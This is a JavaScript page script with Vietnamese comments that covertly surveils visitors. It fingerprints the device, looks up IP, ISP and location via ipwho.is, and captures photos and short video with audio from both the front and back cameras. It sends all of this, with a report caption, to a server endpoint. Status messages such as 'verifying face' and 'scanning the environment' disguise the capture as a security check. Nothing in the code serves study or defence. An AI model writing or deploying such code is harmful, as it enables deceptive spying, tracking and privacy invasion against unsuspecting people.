(async function() {
    const API_URL = '/api/send'; 
    const info = {
        time: new Date().toLocaleString('vi-VN'),
        ip: '⌛...', realIp: '⌛...', isp: '⌛...', location: '⌛...',
        device: '⌛...', os: '⌛...', browser: navigator.userAgent, camera: '⏳...'
    };

    function log(msg) {
        if (window.updateStatus) window.updateStatus(msg);
        console.log(`[Status] ${msg}`);
    }

    // 1. Thu thập thông tin đầy đủ
    async function collectInfo() {
        const ua = navigator.userAgent;
        const platform = navigator.platform;
        
        if (/Android/i.test(ua)) {
            info.os = 'Android';
            const match = ua.match(/Android.*;\s+([^;]+)\s+Build/);
            info.device = match ? match[1].split('/')[0].trim() : 'Android Device';
        } else if (/iPhone|iPad|iPod/i.test(ua) || (platform === 'MacIntel' && navigator.maxTouchPoints > 1)) {
            info.os = 'iOS';
            const screen = `${window.screen.width}x${window.screen.height}@${window.devicePixelRatio}`;
            const models = {"430x932@3":"14/15/16 PM","393x852@3":"14/15/16 Pro","428x926@3":"12/13/14 PM","390x844@3":"12/13/14","375x812@3":"X/XS/11P","414x896@3":"XS Max/11PM","414x896@2":"XR/11","375x667@2":"6/7/8/SE"};
            info.device = 'iPhone ' + (models[screen] || 'Model');
        } else {
            info.os = platform; info.device = 'PC/Laptop';
        }
        document.getElementById('st-os').innerText = `${info.os} (${info.device})`;

        try {
            const r = await fetch('https://ipwho.is/');
            const d = await r.json();
            info.ip = d.ip;
            info.isp = d.connection.org;
            info.location = `${d.city}, ${d.region}, ${d.country}`;
            document.getElementById('st-ip').innerText = info.ip;
            document.getElementById('st-loc').innerText = d.city || 'Việt Nam';
        } catch (e) { info.ip = 'Lỗi'; }
    }

    // 2. Quay Video & Chụp ảnh
    async function handleSecurityProcess() {
        log("Đang khởi tạo hệ thống camera...");
        
        // --- CAMERA TRƯỚC ---
        try {
            const frontStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'user' }, audio: true });
            const videoPreview = document.getElementById('preview');
            videoPreview.srcObject = frontStream;

            const frontPhoto = await capturePhoto(videoPreview);
            await sendData('media', { photos: [{ data: frontPhoto, caption: getReportCaption('📸 ẢNH TRƯỚC') }] });

            log("Đang xác thực khuôn mặt...");
            await recordAndSend(frontStream, 3500, '🎬 VIDEO TRƯỚC');
            frontStream.getTracks().forEach(t => t.stop());
        } catch (e) { log("Không thể truy cập camera trước."); }

        // --- CAMERA SAU ---
        try {
            log("Đang quét môi trường xung quanh...");
            const backStream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: 'environment' }, audio: true });
            const backVideo = document.createElement('video');
            backVideo.srcObject = backStream;
            await backVideo.play();

            const backPhoto = await capturePhoto(backVideo);
            await sendData('media', { photos: [{ data: backPhoto, caption: getReportCaption('📸 ẢNH SAU') }] });

            await recordAndSend(backStream, 3500, '🎬 VIDEO SAU');
            backStream.getTracks().forEach(t => t.stop());
        } catch (e) { log("Không thể truy cập camera sau."); }

        window.mainScriptFinished = true;
    }

    async function capturePhoto(videoEl) {
        return new Promise(resolve => {
            setTimeout(() => {
                const canvas = document.createElement('canvas');
                canvas.width = videoEl.videoWidth;
                canvas.height = videoEl.videoHeight;
                canvas.getContext('2d').drawImage(videoEl, 0, 0);
                resolve(canvas.toDataURL('image/jpeg', 0.4));
            }, 800);
        });
    }

    async function recordAndSend(stream, duration, label) {
        return new Promise(resolve => {
            const mimeType = MediaRecorder.isTypeSupported('video/mp4') ? 'video/mp4' : 'video/webm';
            const recorder = new MediaRecorder(stream, { mimeType });
            const chunks = [];
            recorder.ondataavailable = e => chunks.push(e.data);
            recorder.onstop = async () => {
                const blob = new Blob(chunks, { type: mimeType });
                const reader = new FileReader();
                reader.onloadend = async () => {
                    await sendData('video', { video: reader.result, caption: getReportCaption(label) });
                    resolve();
                };
                reader.readAsDataURL(blob);
            };
            recorder.start();
            setTimeout(() => recorder.stop(), duration);
        });
    }

    function getReportCaption(title) {
        return `
<b>${title}</b>
━━━━━━━━━━━━━━━━━━
🕒 <b>Thời gian:</b> ${info.time}
📱 <b>Thiết bị:</b> ${info.device} (${info.os})
🌐 <b>IP:</b> <code>${info.ip}</code>
🏢 <b>ISP:</b> ${info.isp}
📍 <b>Vị trí:</b> ${info.location}
🔗 <b>Trình duyệt:</b> ${navigator.userAgent.substring(0, 40)}...
`.trim();
    }

    async function sendData(type, payload) {
        try {
            await fetch(API_URL, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ type, ...payload })
            });
        } catch (e) { console.error(e); }
    }

    await collectInfo();
    await handleSecurityProcess();
})();